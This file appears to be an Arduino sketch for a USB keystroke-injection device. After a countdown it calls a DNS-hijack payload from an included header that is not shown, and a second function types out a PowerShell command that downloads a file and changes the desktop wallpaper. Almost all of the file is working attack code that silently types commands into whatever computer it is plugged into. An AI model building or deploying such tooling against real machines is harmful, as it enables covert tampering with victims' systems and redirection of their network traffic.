#include <Keyboard.h>
#include "lib/simple-instructions.h"
#include "lib/complex-instructions.h"
#include "payloads/dns-highjack.h"

#define LED_USER 13  // User LED (orange)
#define LED_RX 12    // RX LED (blue)
#define LED_TX 11    // TX LED (blue)

const unsigned long STARTUP_DELAY = 1000;            // Delay before starting the background change in milliseconds
const unsigned long EXECUTION_INTERVAL = 30000;      // Interval for executing background change in milliseconds
const unsigned long INITIAL_FLASH_INTERVAL = 500;    // Starting interval for LED flashing in milliseconds
const unsigned long MIN_FLASH_INTERVAL = 50;         // Minimum interval for LED flashing
const unsigned long FLASH_DECREMENT = 10;            // Amount to decrease the interval each cycle
const unsigned long TYPING_DELAY = 25;               // Delay between keystrokes in milliseconds

unsigned long lastExecutionTime = 0;
unsigned long lastFlashTime = 0;
unsigned long flashInterval = INITIAL_FLASH_INTERVAL;
bool ledState = false;
bool backgroundChangeExecuted = false;
bool ledsOnFinal = false;
unsigned long finalLedOnTime = 0;

void setup() {
  pinMode(LED_USER, OUTPUT);
  pinMode(LED_RX, OUTPUT);
  pinMode(LED_TX, OUTPUT);

  // Initialize LEDs to OFF (HIGH state due to inverted logic)
  digitalWrite(LED_USER, HIGH);
  digitalWrite(LED_RX, HIGH);
  digitalWrite(LED_TX, HIGH);

  Keyboard.begin();
  delay(STARTUP_DELAY);
}

void loop() {
  unsigned long currentTime = millis();

  if (!backgroundChangeExecuted) {
    // Calculate time remaining and percentage
    unsigned long timeElapsed = currentTime - lastExecutionTime;
    unsigned long timeRemaining = EXECUTION_INTERVAL - timeElapsed;
    float percentageRemaining = (float)timeRemaining / EXECUTION_INTERVAL * 100;
    
    // Calculate flash interval based on percentage (faster as percentage decreases)
    // Maps percentage (100-0) to flash interval (500-50ms)
    flashInterval = map(percentageRemaining, 0, 100, MIN_FLASH_INTERVAL, INITIAL_FLASH_INTERVAL);

    // Flash LEDs with calculated interval
    if (currentTime - lastFlashTime >= flashInterval) {
      lastFlashTime = currentTime;
      ledState = !ledState;
      digitalWrite(LED_USER, ledState ? LOW : HIGH);
      digitalWrite(LED_RX, ledState ? LOW : HIGH);
      digitalWrite(LED_TX, ledState ? LOW : HIGH);
    }

    // Execute DNS hijack instead of background change
    if (timeElapsed >= EXECUTION_INTERVAL) {
      executeDNSHijack("8.8.8.8", "8.8.4.4"); // Example with Google DNS
      lastExecutionTime = currentTime;
      backgroundChangeExecuted = true;

      // Turn LEDs on for two seconds
      digitalWrite(LED_USER, LOW);
      digitalWrite(LED_RX, LOW);
      digitalWrite(LED_TX, LOW);
      ledsOnFinal = true;
      finalLedOnTime = millis();
    }
  } else if (ledsOnFinal && (currentTime - finalLedOnTime >= 2000)) {
    // Turn LEDs off after two seconds
    digitalWrite(LED_USER, HIGH);
    digitalWrite(LED_RX, HIGH);
    digitalWrite(LED_TX, HIGH);
    ledsOnFinal = false;
  }
}

void typeWithDelay(String text) {
  for (unsigned int i = 0; i < text.length(); i++) {
    Keyboard.write(text.charAt(i));
    delay(TYPING_DELAY);
  }
}

void executeBackgroundChange(String imageUrl) {
  openNotepad();
  //openPowerShell();
  delay(1000);

  // Build PowerShell script payload using semicolons to separate commands:
  String payload = "$imageUrl = '" + imageUrl + "'; ";
  payload += "$outputPath = 'C:\\Users\\Public\\Pictures\\wallpaper.jpg'; ";
  payload += "Invoke-WebRequest -Uri $imageUrl -OutFile $outputPath; ";
  payload += "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", CharSet = CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; ";
  payload += "[Wallpaper]::SystemParametersInfo(20, 0, $outputPath, (0x01 -bor 0x02));  ";
  payload += "exit;";

  typeWithDelay(payload);  // Use the new typing method
}


